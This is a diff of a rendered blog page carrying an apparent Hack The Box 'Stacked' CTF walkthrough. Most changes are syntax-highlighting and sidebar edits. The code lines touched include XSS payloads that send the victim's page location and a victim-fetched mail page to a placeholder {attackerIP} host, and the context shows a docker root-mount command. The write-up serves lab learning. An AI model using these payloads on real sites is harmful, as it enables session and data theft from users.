@@ -971,9 +971,9 @@ attacker machine
 2
 3
 4
-</pre></td><td class="rouge-code"><pre><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="k">async</span><span class="p">)</span>
+</pre></td><td class="rouge-code"><pre><span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">method</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="k">async</span><span class="p">)</span>
 <span class="c1">// if async = false, the script itself will not go foward, until the response. Otherwise, we will get null.</span>
-<span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span>
+<span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span>
 <span class="c1">// body: Optional, A body of data to be sent in the XHR request.</span>
 </pre></td></tr></tbody></table></code></div>    </div>
   </li>
@@ -995,9 +995,9 @@ attacker machine
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
-</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">exfilreq</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>    
-<span class="nx">exfilreq</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://{attackerIP}/</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>    
-<span class="nx">exfilreq</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span> 
+</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">exfilreq</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>    
+<span class="nx">exfilreq</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://{attackerIP}/</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>    
+<span class="nx">exfilreq</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span> 
 </pre></td></tr></tbody></table></code></div></div>
 <ul>
   <li>set above script as pwn.js</li>
@@ -1024,14 +1024,14 @@ attacker machine
 10
 </pre></td><td class="rouge-code"><pre><span class="c1">// Make target to visit the target</span>
 <span class="kd">var</span> <span class="nx">target</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">{the address we want victim to visit}</span><span class="dl">"</span>
-<span class="kd">var</span> <span class="nx">req1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
-<span class="nx">req1</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="nx">target</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
-<span class="nx">req1</span><span class="p">.</span><span class="nx">send</span><span class="p">()</span>
+<span class="kd">var</span> <span class="nx">req1</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">req1</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">GET</span><span class="dl">'</span><span class="p">,</span> <span class="nx">target</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>
+<span class="nx">req1</span><span class="p">.</span><span class="nf">send</span><span class="p">()</span>
 <span class="kd">var</span> <span class="nx">response</span><span class="o">=</span><span class="nx">req1</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
 <span class="c1">// Send what victim saw back to us</span>
-<span class="kd">var</span> <span class="nx">req2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
-<span class="nx">req2</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://{attackerIP}:8000/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">)</span>
-<span class="nx">req2</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">req2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">req2</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://{attackerIP}:8000/</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">)</span>
+<span class="nx">req2</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
 </pre></td></tr></tbody></table></code></div></div>
 <ul>
   <li>set target to “http://mail.stacked.htb/read-mail.php?id=1”</li>
@@ -1081,7 +1081,7 @@ aws <span class="o">[</span><span class="nb">command</span><span class="o">]</sp
 5
 </pre></td><td class="rouge-code"><pre><span class="c1">//example from official website</span>
 <span class="nx">exports</span><span class="p">.</span><span class="nx">handler</span> <span class="o">=</span> <span class="k">async</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="nx">context</span><span class="p">){</span>
-  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Event: </span><span class="se">\n</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="kc">null</span> <span class="p">,</span><span class="mi">2</span><span class="p">))</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Event: </span><span class="se">\n</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">event</span><span class="p">,</span> <span class="kc">null</span> <span class="p">,</span><span class="mi">2</span><span class="p">))</span>
   <span class="k">return</span> <span class="nx">context</span><span class="p">.</span><span class="nx">logStreamName</span>
 <span class="p">}</span>
 </pre></td></tr></tbody></table></code></div></div>
@@ -1353,6 +1353,11 @@ docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span 
         
         
         
+      <li><a href="/posts/Network-Security/">Network Security</a></li>
+      
+        
+        
+        
       <li><a href="/posts/CPP-the-Cherno/">C++ The Cherno</a></li>
       
         
@@ -1369,11 +1374,6 @@ docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span 
         
         
       <li><a href="/posts/Linux-for-CTF/">Linux for CTF</a></li>
-      
-        
-        
-        
-      <li><a href="/posts/BOF/">Buffer over flow</a></li>
       
     </ul>
   </div> <!-- #access-lastmod -->
@@ -1505,6 +1505,120 @@ docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span 
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
         
         
@@ -1729,6 +1843,46 @@ docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span 
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
         
         
@@ -1847,162 +2001,10 @@ docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span 
     
     
     
-      
-    
   
     
     
     
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -2179,13 +2181,13 @@ docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span 
       <a class="post-tag" href="/tags/htb/">htb</a>
     
       
+      <a class="post-tag" href="/tags/linux/">linux</a>
+    
+      
       <a class="post-tag" href="/tags/burpsuite/">burpsuite</a>
     
       
       <a class="post-tag" href="/tags/jekyll/">jekyll</a>
-    
-      
-      <a class="post-tag" href="/tags/linux/">linux</a>
     
       
       <a class="post-tag" href="/tags/oscp/">oscp</a>
@@ -2257,6 +2259,19 @@ docker run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span 
 
 
 
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
 
 
   
@@ -2882,6 +2897,120 @@ See 80, 3000 port run the same thing:
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
         
         
@@ -3106,6 +3235,46 @@ See 80, 3000 port run the same thing:
     
     
     
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
       
         
         
@@ -3224,162 +3393,10 @@ See 80, 3000 port run the same thing:
     
     
     
-      
-    
   
     
     
     
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-        
-        
-
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
-    
-  
-    
-    
-    
-    
-  
-    
-    
-    
-    
-      
     
   
     
@@ -3556,13 +3573,13 @@ See 80, 3000 port run the same thing:
       <a class="post-tag" href="/tags/htb/">htb</a>
     
       
+      <a class="post-tag" href="/tags/linux/">linux</a>
+    
+      
       <a class="post-tag" href="/tags/burpsuite/">burpsuite</a>
     
       
       <a class="post-tag" href="/tags/jekyll/">jekyll</a>
-    
-      
-      <a class="post-tag" href="/tags/linux/">linux</a>
     
       
       <a class="post-tag" href="/tags/oscp/">oscp</a>
